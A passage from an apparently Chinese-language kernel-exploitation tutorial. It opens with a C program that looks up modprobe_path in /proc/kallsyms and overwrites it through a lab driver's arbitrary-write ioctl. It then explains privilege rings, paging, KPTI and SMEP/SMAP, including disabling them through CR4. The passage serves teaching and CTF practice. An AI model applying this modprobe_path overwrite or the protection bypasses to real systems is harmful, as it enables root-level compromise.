class="string">&lt;stdint-gcc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">byte_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">unsigned</span> <span class="type">char</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len ? <span class="built_in">printf</span>(<span class="string">&quot; %02x&quot;</span>, buf8[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span> &amp;&amp; j + i &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i + j]) ? buf8[i + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_symbol_address</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *symbol_name)</span> &#123;</span><br><span class="line">    FILE *kallsyms_fp = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!kallsyms_fp) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open /proc/kallsyms&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> symbol_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x80</span>] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">while</span> (!symbol_addr &amp;&amp; fgets(buf, <span class="keyword">sizeof</span>(buf), kallsyms_fp)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, symbol_name)) &#123;</span><br><span class="line">            <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx %*s %*s&quot;</span>, &amp;symbol_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(kallsyms_fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (symbol_addr) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] symbol address: %#016llx\n&quot;</span>, symbol_addr);</span><br><span class="line">        <span class="keyword">return</span> symbol_addr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to get symbol address.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;/dev/memrw&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_READ_MEMORY 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_WRITE_MEMORY 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 256</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memrw_param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> address; <span class="comment">// User-space provided virtual address</span></span><br><span class="line">    <span class="type">size_t</span> size; <span class="comment">// Read/write length</span></span><br><span class="line">    <span class="type">uint8_t</span> data[BUFFER_SIZE]; <span class="comment">// Data buffer for write operation</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> modprobe_path_addr = get_symbol_address(<span class="string">&quot;modprobe_path&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (modprobe_path_addr == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dev_fd = open(DEVICE_NAME, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to open device&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *modprobe_path = <span class="string">&quot;/tmp/my_modprobe&quot;</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">memrw_param</span> <span class="title">write_param</span> =</span> &#123;</span><br><span class="line">        .address = modprobe_path_addr,</span><br><span class="line">        .size = <span class="built_in">strlen</span>(modprobe_path),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(write_param.data, modprobe_path);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] changing modprobe_path...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ioctl(dev_fd, IOCTL_WRITE_MEMORY, &amp;write_param) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;IOCTL write failed&quot;</span>);</span><br><span class="line">        close(dev_fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">memrw_param</span> <span class="title">read_param</span> =</span> &#123;</span><br><span class="line">        .address = modprobe_path_addr,</span><br><span class="line">        .size = <span class="number">0x20</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] reading ptrace_scope...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ioctl(dev_fd, IOCTL_READ_MEMORY, &amp;read_param) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;IOCTL write failed&quot;</span>);</span><br><span class="line">        close(dev_fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    byte_dump(<span class="string">&quot;modprobe_path&quot;</span>, read_param.data, read_param.size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h1><h2 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h2><p>Ring Model 是一种 <strong>CPU 权限级别（Privilege Level）</strong> 的分层架构，主要用于操作系统中处理权限隔离和保护。它通过硬件机制，限制不同权限级别的代码对系统资源的访问，从而提高系统的安全性和稳定性。</p>
<p>Ring Model 的分层通常分为 4 个等级，编号从 0 到 3：<code>Ring 0</code>，<code> Ring 1</code>， <code>Ring 2</code>， <code>Ring 3</code>。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/c715813e764b9d971b01092ef652bac5.png"
                     
                ></p>
<p>尽管 x86 架构支持 4 级 Ring 模型，但 Linux 只使用了 <strong>Ring 0</strong> 和 <strong>Ring 3</strong>：</p>
<table>
<thead>
<tr>
<th><strong>Ring</strong></th>
<th><strong>用途</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Ring 0</td>
<td><strong>内核态（Kernel Mode）</strong>：操作系统核心代码运行的位置，包括内存管理、设备驱动、进程调度等。</td>
</tr>
<tr>
<td>Ring 3</td>
<td><strong>用户态（User Mode）</strong>：用户程序运行的位置，如 <code>bash</code>、<code>vim</code> 等。</td>
</tr>
</tbody></table>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>Ring Model 主要隔离和保护的是<strong>不同级别的内存访问权限（RWX）</strong>和<strong>特权指令执行</strong>。这是 Ring Model 的两个支柱，也是它提供安全隔离的根本所在。</p>

    </div>
  </div>

<h2 id="权限保护机制"><a href="#权限保护机制" class="headerlink" title="权限保护机制"></a>权限保护机制</h2><h3 id="段保护机制"><a href="#段保护机制" class="headerlink" title="段保护机制"></a>段保护机制</h3><ul>
<li><strong>段（Segment）</strong> 是 x86 架构中内存管理的基础单元。每个段定义了一个线性地址范围，程序通过段选择子和偏移量访问内存。</li>
<li>CPU 使用段保护机制，通过段选择子（Segment Selector）和段描述符（Descriptor）来控制不同权限级别（Ring）的内存访问，防止越权操作。</li>
</ul>
<h4 id="段选择子（Segment-Selector）"><a href="#段选择子（Segment-Selector）" class="headerlink" title="段选择子（Segment Selector）"></a>段选择子（Segment Selector）</h4><p>段选择子是存储在 CPU 段寄存器（代码段 <code>cs</code>、数据段 <code>ds</code>、栈段 <code>ss</code> 等）中的低 16 位值，标识了当前程序使用的段。它是程序访问内存段的入口，索引全局或局部段描述符表（GDT 或 LDT）。</p>
<p>段选择子的格式如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/4f2684f1ab4ad202e7f03c900f782bdb.png"
                     
                ></p>
<ul>
<li><p><strong>Index（段索引，13 位）</strong>：指向段描述符表（GDT 或 LDT）中的一个条目，标识具体的段。</p>
</li>
<li><p><strong>TI（Table Indicator，1 位）</strong>：决定段描述符表的类型：</p>
<ul>
<li>值为 <code>0</code> 表示选择 <strong>GDT（Global Descriptor Table，全局描述符表）</strong>。</li>
<li>值为 <code>1</code> 表示选择 <strong>LDT（Local Descriptor Table，局部描述符表）</strong>。</li>
</ul>
</li>
<li><p><strong>RPL（Requested Privilege Level，请求权限级别，2 位）</strong>：</p>
<ul>
<li>指定程序期望访问目标段时的权限级别，范围为 <code>0-3</code>。</li>
<li>通常，RPL 由调用方设定，用于在段访问中动态降低权限。</li>
</ul>
</li>
</ul>
<h4 id="段描述符（Descriptor）"><a href="#段描述符（Descriptor）" class="headerlink" title="段描述符（Descriptor）"></a>段描述符（Descriptor）</h4><p>每个段在 GDT 或 LDT 中对应一个段描述符。描述符包含了段的基地址、大小、类型和权限等信息。</p>
<p>段描述符的格式如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/5a166703c04f45dcaa7dcbf456f5b673.png"
                     
                ></p>
<ul>
<li><p><strong>Base Address（基地址，32 位）</strong>：段的起始地址。在 64 位模式下，基地址通常被固定为 <code>0</code>，即扁平内存模型。</p>
</li>
<li><p><strong>Segment Limit（段大小，20 位）</strong>：定义段的大小（单位为字节）。在 64 位模式下，通常被忽略，因为地址空间被扩展到 48 位或更高。</p>
</li>
<li><p><strong>Access Rights（访问权限，8 位）</strong>：包含段的类型和权限字段：</p>
<ul>
<li><strong>类型位（Type）</strong>：定义段的用途，如代码段、数据段或系统段。不同的类型有不同的内存权限。</li>
<li><strong>S 位（Descriptor Type）</strong>：区分系统段（S&#x3D;0）和普通段（S&#x3D;1）。<ul>
<li><strong>S &#x3D; 0</strong>：系统段（System Segment），包含特定于系统使用的结构或功能，例如任务状态段（TSS）、中断描述符表（IDT）或局部描述符表（LDT）。</li>
<li><strong>S &#x3D; 1</strong>：代码段或数据段，表示常规的用户态或内核态段，用于存储可执行代码或数据。</li>
</ul>
</li>
<li><strong>DPL（Descriptor Privilege Level）</strong>：段的权限级别，范围为 <code>0-3</code>，表示对该段的访问要求。</li>
</ul>
</li>
</ul>
<h4 id="权限类型"><a href="#权限类型" class="headerlink" title="权限类型"></a>权限类型</h4><ul>
<li><strong>CPL（Current Privilege Level）</strong>：<ul>
<li>表示当前程序的运行权限级别，通常由 CS 寄存器的低两位（代码段段选择子）决定。</li>
<li><strong>CPL</strong> 的值必须低于或等于段描述符中的 DPL 才能访问该段。</li>
</ul>
</li>
<li><strong>RPL（Requested Privilege Level）</strong>：<ul>
<li>请求访问段时指定的权限级别。通常由访存时使用的段寄存器的段选择子决定</li>
<li><strong>RPL</strong> 的值不能高于段的 DPL。</li>
</ul>
</li>
<li><strong>DPL（Descriptor Privilege Level）</strong>：<ul>
<li>描述符中定义的段权限级别。</li>
</ul>
</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>简单总结一下，就是当前的执行代码的权限（CPL）和请求访问内存的权限（RPL）都不能低于（值要小于等于）段描述符描述的目标内存的权限。</p>

    </div>
  </div>

<h4 id="权限检查过程"><a href="#权限检查过程" class="headerlink" title="权限检查过程"></a>权限检查过程</h4><p>这里以 <code>mov rax, qword ptr ds:[0xdeadbeef]</code> 为例介绍一下段保护机制权限检查的过程。</p>
<ol>
<li><p><strong>读取 <code>DS</code> 段选择子</strong>：CPU 从 <code>DS</code> 段寄存器中读取段选择子的值。</p>
</li>
<li><p><strong>读取段描述符</strong>：CPU 从 <code>DS</code> 段寄存器中读取段选择子的值。这里先根据段选择子的 <code>TI</code> 位确定是 GDT，然后根据 <code>Index</code> 字段中 GDT 中找到段描述符。</p>
</li>
<li><p><strong>检查 S 位（Descriptor Type）</strong>：因为是访存操作，所以要求 S 位为 1（数据段）。</p>
</li>
<li><p><strong>检查 RPL（Requested Privilege Level）</strong>：CPU 会比较 <code>max(CPL, RPL)</code> 和目标段描述符的 <code>DPL</code>（Descriptor Privilege Level）。如果结果大于目标段的 DPL，则触发 **General Protection Fault (GPF)**。</p>
</li>
<li><p><strong>检查段描述符类型：</strong>根据段描述符的 <strong>Access Rights</strong> 字段的<strong>类型位（Type）</strong>确认操作（读取数据）符合段的权限（RW 位）。</p>
</li>
</ol>
<h3 id="页保护机制"><a href="#页保护机制" class="headerlink" title="页保护机制"></a>页保护机制</h3><p>在 64 位系统（如 x86_64 架构）中，<strong>页保护机制</strong>是内存管理的核心，通过分页（Paging）机制实现虚拟地址到物理地址的映射，同时提供<strong>细粒度的权限控制</strong>（例如用户空间与内核空间的隔离）。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>关于分页机制会在内存管理部分详细介绍，这里仅介绍权限管理相关内容。</p>

    </div>
  </div>

<h4 id="权限字段"><a href="#权限字段" class="headerlink" title="权限字段"></a>权限字段</h4><p>每个页表条目（Page Table Entry, PTE）包含物理地址和权限信息：</p>
<ul>
<li><p><strong>P（Present）</strong>：第 0 位，表示页是否有效。如果为 <code>0</code>，表示页不在内存中（可能在磁盘上），访问时会触发 <strong>Page Fault</strong>。</p>
</li>
<li><p><strong>R&#x2F;W（Read&#x2F;Write）</strong>：第 1 位，表示页是否可写。如果为 <code>0</code>，则该页只读。</p>
</li>
<li><p><strong>U&#x2F;S（User&#x2F;Supervisor）</strong>：第 2 位，表示用户态（Ring 3）是否可以访问：</p>
<ul>
<li><p><strong>U &#x3D; 1</strong>：用户态可访问。</p>
</li>
<li><p><strong>U &#x3D; 0</strong>：仅内核态（Ring 0）可访问。</p>
</li>
</ul>
</li>
<li><p><strong>NX（No Execute）</strong>：第 63 位，表示页是否可执行：如果为 <code>1</code>，则该页不可执行（需要 CPU 支持 NX 位）。</p>
</li>
</ul>
<h4 id="Linux-的-KPTI-机制"><a href="#Linux-的-KPTI-机制" class="headerlink" title="Linux 的 KPTI 机制"></a>Linux 的 KPTI 机制</h4><p><strong>Kernel Page Table Isolation（KPTI）</strong> 是一种内核内存隔离机制，最初是在 <strong>Linux 4.15</strong> （2018年1月发布）版本中引入，用于解决 <strong>Meltdown 漏洞（CVE-2017-5754）</strong>。</p>
<blockquote>
<p>Meltdown 是一种硬件级漏洞，该漏洞利用了现代处理器的分支预测和缓存特性，可以通过侧信道攻击绕过用户态与内核态的隔离，使得用户态程序可以读取内核内存中的敏感数据。</p>
<ul>
<li><p>当用户态访问内核地址时，尽管会触发权限检查失败，但在实际触发前，CPU 已经通过分支预测机制将数据加载到缓存中。</p>
</li>
<li><p>攻击者可以通过读取缓存侧信道（如时间测量等技术）获取这些数据。</p>
</li>
</ul>
</blockquote>
<h5 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h5><p>在传统未开启 KPTI 的 Linux 系统中，内核页表和用户页表共存于同一张全局页表（PGD）。开启 KPTI 后，内核为用户态和内核态分别维护两张独立的页全局目录（PGD）。</p>
<ul>
<li><strong>内核页表</strong>：包含用户和内核地址空间的完整映射。但是用对应户空间的页表项会添加 <code>_PAGE_NX </code> 标志，以阻止执行内核态页表所映射用户地址空间的代码。在 <code>KAISER patch</code> 里把这一步骤叫 毒化（<code>poison</code>）。</li>
<li><strong>用户页表</strong>：完整映射用户地址空间。但内核地址空间仅保留必要的条目（如系统调用入口和中断处理）。</li>
</ul>
<p>由于每张页全局目录表占用 4 KB，两张页表连续分配在内存中，因此两张全局页目录表的地址仅在第 13 位不同。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/KPTI.drawio.svg"
                     
                ></p>
<ul>
<li>用户态进入内核态：当用户态程序通过 <strong>系统调用</strong> 或 <strong>中断</strong> 进入内核态时，会执行用户态页表映射的系统调用入口代码。在这段代码会将 <strong>CR3 寄存器的第 13 位取反</strong>，切换到内核页表，这样就可以访问完整的内核空间。</li>
<li>内核态返回用户态：内核完成系统调用或中断处理后，需要切换回用户态，此时内核通过<strong>取反 CR3 的第 13 位</strong>，切换回用户页表。切换完成后，内核地址空间的绝大部分被剥离，仅保留必要的条目。</li>
</ul>
<h5 id="保护效果"><a href="#保护效果" class="headerlink" title="保护效果"></a>保护效果</h5><p>开启 KPTI 保护之后：</p>
<ul>
<li>用户空间和内核空间的页表分开，从而实现了内核空间与用户空间的地址完全隔离，阻止了 Meltdown 攻击利用的内存泄漏路径。</li>
<li>由于内核页表中对应户空间的页表项会添加 <code>_PAGE_NX </code> 标志，内核空间无法执行用户态代码。</li>
<li>不过内核空间可以正常读写用户空间的内存，这部分操作不受影响。</li>
</ul>
<h5 id="查看-KPTI-开启情况"><a href="#查看-KPTI-开启情况" class="headerlink" title="查看 KPTI 开启情况"></a>查看 KPTI 开启情况</h5><p>在现代 Linux 系统中，<code>/sys/devices/system/cpu/vulnerabilities/</code> 目录下会包含与 CPU 漏洞相关的信息。其中 <code>/sys/devices/system/cpu/vulnerabilities/meltdown</code> 文件中有关于 KPTI 保护的相关信息。如果开启 KPTI 则该文件的内容为 <code>Mitigation: PTI</code>。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></figure></div>

<h5 id="开启或关闭-KPTI"><a href="#开启或关闭-KPTI" class="headerlink" title="开启或关闭 KPTI"></a>开启或关闭 KPTI</h5><p>首先我们需要判断内核版本是否不低于 4.15，因为 KPTI 保护是从这个版本开始引入的。</p>
<p>另外 KPTI 的核心代码会根据内核编译选项 <code>CONFIG_PAGE_TABLE_ISOLATION</code> 来确定是否包含在内核中。如果在编译时未启用 <code>CONFIG_PAGE_TABLE_ISOLATION</code> 则 KPTI 的相关代码会被剔除，运行时无法开启或关闭。在这种情况下，KPTI 完全不可用。</p>
<p>通常 KPTI 是通过内核启动参数 <code>kpti</code> 来设置的，<code>kpti=1</code> 开启KPTI保护，<code>kpti=0</code> 关闭 KPTI 保护。但是对于 QEMU 仿真的简易 Linux 环境来说，，<strong>虚拟 CPU 模型</strong>会覆盖这些设置。</p>
<p>在虚拟化环境中，QEMU 提供了多个虚拟 CPU 模型，<code>kvm64</code> 和 <code>qemu64</code> 就是其中两种常见的模型。不同的 CPU 模型和虚拟化配置会影响虚拟机中运行的内核行为。</p>
<ul>
<li>**<code>kvm64</code>**：这是 KVM 默认的 CPU 模型，它模拟了一种更现代的 CPU，通常启用了现代的硬件安全特性，包括 KPTI。使用 <code>kvm64</code> 模型时，虚拟机的内核会自动启用 KPTI 以保护系统免受 <strong>Meltdown</strong> 漏洞的影响。</li>
<li>**<code>qemu64</code>**：这是 QEMU 提供的基本 CPU 模型，不启用 KVM 的加速功能（即使 QEMU 本身在运行时）。使用 <code>qemu64</code> 模型时，QEMU 可能模拟的 CPU 特性不包括 KPTI，因此内核不会启用 KPTI 保护。</li>
</ul>
<p><strong>也就是说我们设置 <code>-cpu kvm64</code> 就可以开启 KPTI 保护，设置 <code>-cpu qemu64</code> 就可以关闭 KPTI 保护。</strong></p>
<h3 id="CPU-硬件保护机制"><a href="#CPU-硬件保护机制" class="headerlink" title="CPU 硬件保护机制"></a>CPU 硬件保护机制</h3><p><code>CR4</code> 是 x86 架构中一个非常重要的控制寄存器，用于控制一些与操作系统安全、内存管理、异常处理等相关的硬件特性。</p>
<p>其中 <strong>SMEP（20 位）</strong>和 <strong>SMAP（21 位）</strong>是两个与权限保护相关的标志位。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/image-20241222231048999.png"
                     
                ></p>
<p>通常我们可以通过设置 <code>CR4</code> 寄存器的值为 0x6F0 来关闭 SMEP 和 SMAP 保护。</p>
<h4 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h4><p><strong>SMEP (Supervisor Mode Execution Prevention)</strong> 是一种用于提高计算机系统安全性的硬件级保护机制，旨在<strong>防止在内核模式下执行用户空间中的代码</strong>。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>开启 SMEP 不影响内核空间代码读写用户空间的内存。</p>

    </div>
  </div>

<h4 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h4><p><strong>SMAP</strong>（Supervisor Mode Access Prevention）是现代 CPU 中的一项硬件安全特性，用于保护内核模式（Ring 0）和用户模式（Ring 3）之间的内存访问隔离。它通过<strong>限制内核代码访问用户空间的内存</strong>，减少了内核受到攻击的风险。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>开启 SMAP 后内核空间代码虽然不能读写用户空间的数据，但是可以执行用户空间的代码。</p>

    </div>
  </div>

<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><h3 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h3><p><strong>系统调用（System Call）</strong> 是操作系统提供给用户程序的一组接口，用于请求内核执行特定的服务或操作，如文件读写、进程控制、网络通信等。系统调用充当了 <strong>用户态（Ring 3）</strong> 与 <strong>内核态（Ring 0）</strong> 之间的桥梁，允许用户程序以安全且受控的方式访问系统资源。</p>
<p>由于内核具有更高的权限级别，用户程序不能直接操作硬件资源或访问敏感内存。因此，系统调用是用户程序请求内核服务的唯一合法途径。这种隔离保护机制有助于提升系统的安全性和稳定性。</p>
<p>在 x86_64 架构中，系统调用通常通过 <strong>syscall 指令</strong> 或 <strong>int 0x80 指令</strong> 实现，两者都可以用来触发用户态到内核态的切换。其中，<code>syscall</code> 是现代 x86_64 架构中常用的实现方式，性能更优。</p>
<h3 id="x86-系统调用相关指令"><a href="#x86-系统调用相关指令" class="headerlink" title="x86 系统调用相关指令"></a>x86 系统调用相关指令</h3><h4 id="系统调用指令"><a href="#系统调用指令" class="headerlink" title="系统调用指令"></a>系统调用指令</h4><p>在 32 位架构中，主要的系统调用指令有 <strong><code>int</code></strong> 和 **<code>sysenter</code>**，两者具有不同的性能和适用场景。另外调用门是原本 CPU 专门为操作系统的系统调用设计的，但是用于性能开销大而基本不被操作系统采用，这里不做介绍。</p>
<h5 id="int-0x80"><a href="#int-0x80" class="headerlink" title="int 0x80"></a>int 0x80</h5><p><code>int</code> 是 x86 架构中的 <strong>软件中断指令</strong>。它是通过生成一个中断信号来改变程序的执行流，跳转到一个特定的中断处理程序。</p>
<p><code>int</code> 指令通过指定中<strong>断向量号</strong>来触发中断处理，其中中断向量号是一个 8 位的数字（范围：0~255），用来标识中断的类型。</p>
<p>考虑到硬件兼容性问题，在 32 位下的 linux 系统调用主要是通过 <code>int 0x80</code> 指令实现。也就是将断向量号为 0x80 的中断作为系统调用。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/int_0x80.drawio.svg"
                     
                ></p>
<p>执行系统调用时，用户态程序需要设置系统调用号和参数，</p>
<ul>
<li><strong><code>EAX</code></strong> ：系统调用号。</li>
<li><strong><code>EBX</code>、<code>ECX</code>、<code>EDX</code>、<code>ESI</code>、<code>EDI</code></strong> ：系统调用的参数。</li>
</ul>
<p>之后，用户态程序执行 <code>int 0x80</code> 指令进行系统调用。<code>int</code> 指令的执行过程十分复杂，这里简单介绍一下执行过程：</p>
<ol>
<li><p><strong>查找和加载中断描述符</strong></p>
<p> 在 <code>int &lt;vector&gt;</code> 指令中，CPU 使用 <strong>中断向量号</strong> 来查找 <strong>IDT 条目</strong>（<code>IDT_ENTRY = IDTR.base + (vector * 8)</code>）。</p>
<blockquote>
<p><code>IDTR</code> 寄存器（Interrupt Descriptor Table Register）是一个特殊寄存器，存储了 IDT 的起始地址（<code>base</code>）和长度（<code>limit</code>）。CPU 使用 <code>IDTR</code> 寄存器来找到 IDT 的基地址和大小。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IDTR:</span><br><span class="line">	base  -&gt; IDT 的起始物理地址。</span><br><span class="line">	limit -&gt; IDT 的大小（字节数 - 1）。</span><br></pre></td></tr></table></figure></div>
</blockquote>
</li>
<li><p><strong>权限和属性检查</strong></p>
<p> 在加载描述符后，CPU 会检查以下内容：</p>
<ul>
<li><p><strong>描述符类型</strong>：确保描述符是有效的中断门（Interrupt Gate）或陷阱门（Trap Gate），如果类型无效，会触发异常。</p>
</li>
<li><p><strong>特权级检查</strong>：CPU 检查当前代码段的 CPL（Current Privilege Level）与描述符的 DPL（Descriptor Privilege Level），如果 CPL &gt; DPL，则拒绝访问，触发 General Protection Fault。</p>
</li>
</ul>
</li>
<li><p><strong>保存当前上下文到栈</strong></p>
<p> CPU 将当前执行环境保存到栈中，以便中断处理完成后能够恢复原状态。</p>
<ul>
<li>如果<strong>没有特权级切换</strong>，即中断处理程序和中断触发点的特权级相同（如都在 Ring 0）则依次保存以下内容到当前栈：<ul>
<li><code>EFLAGS</code></li>
<li><code>CS</code></li>
<li><code>EIP</code></li>
</ul>
</li>
<li>如果发生<strong>特权级切换</strong>，即如果从用户态（Ring 3）切换到内核态（Ring 0）则首先<strong>切换到内核栈</strong>，新的栈指针（<code>ESP0</code>）从任务状态段（TSS）中读取。之后依次保存以下内容到内核栈：<ul>
<li>用户态 <code>SS</code></li>
<li>用户态 <code>ESP</code></li>
<li><code>EFLAGS</code></li>
<li>用户态 <code>CS</code></li>
